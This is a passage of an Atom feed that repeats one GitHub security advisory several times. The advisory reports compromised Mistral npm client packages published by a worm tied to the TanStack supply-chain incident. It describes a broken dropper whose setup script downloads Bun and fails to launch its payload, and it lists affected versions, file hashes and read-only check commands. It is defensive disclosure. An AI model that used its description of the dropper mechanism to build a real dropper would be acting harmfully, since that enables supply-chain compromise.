<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-18T17:55:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@mistralai/mistralai-azure] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
        <updated>2026-05-18T17:55:55.000Z</updated>
        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
<h2 id="impact">Impact</h2>
<p>The dropper <strong>is broken</strong>, it has no impact. </p>
<ul>
<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
</ul>
</li>
</ul>
<p>We still recommend removing the packages, see below for remediation.</p>
<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
<table>
<thead>
<tr>
<th>Package</th>
<th>Affected versions</th>
</tr>
</thead>
<tbody><tr>
<td><code>@mistralai/mistralai</code></td>
<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
</tr>
<tr>
<td><code>@mistralai/mistralai-azure</code></td>
<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
</tr>
<tr>
<td><code>@mistralai/mistralai-gcp</code></td>
<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
</tr>
</tbody></table>
<p>Check installed versions:</p>
<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
</code></pre>
<p>Look for any of the following files</p>
<ul>
<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
</ul>
<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
<h2 id="remediate-affected-systems">Remediate affected systems</h2>
<ol>
<li>Stop using the affected package version immediately.</li>
<li>Clean systems where one of this package has been installed.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-18T17:55:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@mistralai/mistralai] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
        <updated>2026-05-18T17:55:55.000Z</updated>
        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
<h2 id="impact">Impact</h2>
<p>The dropper <strong>is broken</strong>, it has no impact. </p>
<ul>
<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
</ul>
</li>
</ul>
<p>We still recommend removing the packages, see below for remediation.</p>
<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
<table>
<thead>
<tr>
<th>Package</th>
<th>Affected versions</th>
</tr>
</thead>
<tbody><tr>
<td><code>@mistralai/mistralai</code></td>
<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
</tr>
<tr>
<td><code>@mistralai/mistralai-azure</code></td>
<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
</tr>
<tr>
<td><code>@mistralai/mistralai-gcp</code></td>
<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
</tr>
</tbody></table>
<p>Check installed versions:</p>
<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
</code></pre>
<p>Look for any of the following files</p>
<ul>
<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
</ul>
<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
<h2 id="remediate-affected-systems">Remediate affected systems</h2>
<ol>
<li>Stop using the affected package version immediately.</li>
<li>Clean systems where one of this package has been installed.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-18T17:55:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@mistralai/mistralai] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
        <updated>2026-05-18T17:55:55.000Z</updated>
        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
<h2 id="impact">Impact</h2>
<p>The dropper <strong>is broken</strong>, it has no impact. </p>
<ul>
<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
<li><code>execFileSync</code> throws <code>ENOENT</code> and the tmpdir is wiped before payload runs. Bun gets downloaded to a tmpdir but no payload execution.</li>
</ul>
</li>
</ul>
<p>We still recommend removing the packages, see below for remediation.</p>
<h2 id="check-whether-you-are-affected">Check whether you are affected</h2>
<p>You are affected if one of the package versions above was installed in any environment <strong>during the exposure window</strong> or is present in a lockfile, build artifact, container image, package cache, or deployment image.</p>
<table>
<thead>
<tr>
<th>Package</th>
<th>Affected versions</th>
</tr>
</thead>
<tbody><tr>
<td><code>@mistralai/mistralai</code></td>
<td><code>2.2.2</code>, <code>2.2.3</code>, <code>2.2.4</code></td>
</tr>
<tr>
<td><code>@mistralai/mistralai-azure</code></td>
<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
</tr>
<tr>
<td><code>@mistralai/mistralai-gcp</code></td>
<td><code>1.7.1</code>, <code>1.7.2</code>, <code>1.7.3</code></td>
</tr>
</tbody></table>
<p>Check installed versions:</p>
<pre><code class="language-bash">npm ls @mistralai/mistralai @mistralai/mistralai-azure @mistralai/mistralai-gcp
grep -n -A 4 -B 2 -E '@mistralai/(mistralai|mistralai-azure|mistralai-gcp)|2\.2\.[2-4]|1\.7\.[1-3]' \
  package-lock.json pnpm-lock.yaml yarn.lock 2&gt;/dev/null
</code></pre>
<p>Look for any of the following files</p>
<ul>
<li><code>router_init.js</code> (embedded in all @tanstack packages): <code>ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c</code></li>
<li><code>tanstack_runner.js</code> (from git commit): <code>2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96</code></li>
<li><code>@tanstack/setup</code> package.json: <code>7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b</code></li>
</ul>
<p>You may also run this (read-only) <a href="https://gist.github.com/beowolx2/a3ceeb18d1f1cec977d5cc6eaf41c96a">script</a> that will automatically flag known malicious files.</p>
<p>You are not affected by this advisory if you did not install the affected package versions and they are not present in your lockfiles, build caches, deployment artifacts, or package mirrors.</p>
<p>If the command finds an affected version, continue with the <a href="#remediate-affected-systems">remediation steps below</a>. If you use private package mirrors, caches, or container base images, check those copies too.</p>
<h2 id="remediate-affected-systems">Remediate affected systems</h2>
<ol>
<li>Stop using the affected package version immediately.</li>
<li>Clean systems where one of this package has been installed.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/mistralai/client-ts/security/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
<li><a href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7">https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-18T17:55:53.000Z</published>
    </entry>
</feed>